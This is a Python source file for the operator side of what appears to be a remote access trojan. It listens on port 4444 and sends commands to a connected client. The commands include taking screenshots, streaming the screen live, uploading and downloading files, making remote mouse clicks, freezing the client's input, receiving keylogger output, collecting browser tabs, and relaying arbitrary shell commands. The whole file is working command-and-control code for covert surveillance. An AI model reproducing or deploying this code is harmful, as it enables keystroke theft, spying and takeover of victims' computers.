import socket
import threading
import io
from PIL import Image, ImageTk
import tkinter as tk

HOST = '0.0.0.0'
PORT = 4444

executor_number = input("Set executor number (4-digit): ").strip()
print(f"[+] Executor number: {executor_number}")

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Listening on {HOST}:{PORT} ...")

client, addr = server.accept()
print(f"[+] Connection from {addr}")

# Auth
client_executor = client.recv(1024).decode()
if client_executor != executor_number:
    client.send(b'Invalid executor number')
    client.close()
    exit()
client.send(b'OK')

def receive_screenshot(sock):
    size = int(sock.recv(1024).decode())
    sock.send(b'OK')
    data = b''
    while len(data) < size:
        data += sock.recv(4096)
    with open("screenshot.png", "wb") as f:
        f.write(data)
    print("[+] Screenshot saved as screenshot.png")

def upload_file(sock):
    filename = input("Filename to upload to client: ")
    sock.send(filename.encode())
    with open(filename, 'rb') as f:
        data = f.read()
    sock.send(str(len(data)).encode())
    sock.recv(2)
    sock.send(data)
    print("[+] File sent.")

def download_file(sock):
    filename = input("Filename to download from client: ")
    sock.send(filename.encode())
    size = int(sock.recv(1024).decode())
    if size == 0:
        print("[-] File not found on client.")
        return
    sock.send(b'OK')
    data = b''
    while len(data) < size:
        data += sock.recv(4096)
    with open("downloaded_" + filename, "wb") as f:
        f.write(data)
    print("[+] File downloaded.")

def chat(sock):
    print("Type 'exitchat' to end chat.")
    while True:
        msg = input("[You]: ")
        sock.send(msg.encode())
        if msg.lower() == 'exitchat':
            break
        reply = sock.recv(1024).decode()
        print(f"[Client]: {reply}")
        if reply.lower() == 'exitchat':
            break

def click(sock):
    x = input("X position: ")
    y = input("Y position: ")
    click_type = input("Click type (left/right): ")
    sock.send(x.encode())
    sock.recv(2)
    sock.send(y.encode())
    sock.recv(2)
    sock.send(click_type.encode())
    print(sock.recv(1024).decode())

def view_screen(sock):
    root = tk.Tk()
    root.title("Live Screen View")
    panel = None

    def receive_and_show():
        nonlocal panel
        try:
            while True:
                size_data = sock.recv(16)
                if not size_data:
                    break
                size = int(size_data.decode().strip())
                sock.send(b'OK')
                data = b''
                while len(data) < size:
                    packet = sock.recv(4096)
                    if not packet:
                        break
                    data += packet
                if not data:
                    break
                image = Image.open(io.BytesIO(data))
                photo = ImageTk.PhotoImage(image)
                if panel is None:
                    panel = tk.Label(root, image=photo)
                    panel.image = photo
                    panel.pack()
                else:
                    panel.configure(image=photo)
                    panel.image = photo
                root.update()
        except Exception as e:
            print(f"[!] Live view stopped: {e}")
        finally:
            root.destroy()

    threading.Thread(target=receive_and_show, daemon=True).start()
    root.mainloop()

def receive_keylogger(sock):
    print("[*] Receiving keystrokes (type 'stopkey' to stop):")
    while True:
        data = sock.recv(1024).decode()
        if not data or data == 'stopkey':
            break
        print(data, end='', flush=True)

def receive_tabs(sock):
    print("\n[*] Browser tabs info:")
    while True:
        data = sock.recv(1024).decode()
        if data == '[ENDTABS]' or not data:
            break
        print(data)

while True:
    cmd = input("CMD> ").strip()
    if cmd.lower() == 'exit':
        client.send(b'exit')
        break
    elif cmd == 'screenshot':
        client.send(b'screenshot')
        receive_screenshot(client)
    elif cmd == 'upload':
        client.send(b'upload')
        upload_file(client)
    elif cmd == 'download':
        client.send(b'download')
        download_file(client)
    elif cmd == 'chat':
        client.send(b'chat')
        chat(client)
    elif cmd == 'click':
        client.send(b'click')
        click(client)
    elif cmd == 'viewscreen':
        client.send(b'viewscreen')
        view_screen(client)
    elif cmd == 'freeze':
        client.send(b'freeze')
        print(client.recv(1024).decode())
    elif cmd == 'unfreeze':
        client.send(b'unfreeze')
        print(client.recv(1024).decode())
    elif cmd == 'keylogger':
        client.send(b'keylogger')
        receive_keylogger(client)
    elif cmd == 'tabs':
        client.send(b'tabs')
        receive_tabs(client)
    else:
        client.send(cmd.encode())
        print(client.recv(8192).decode())

client.close()
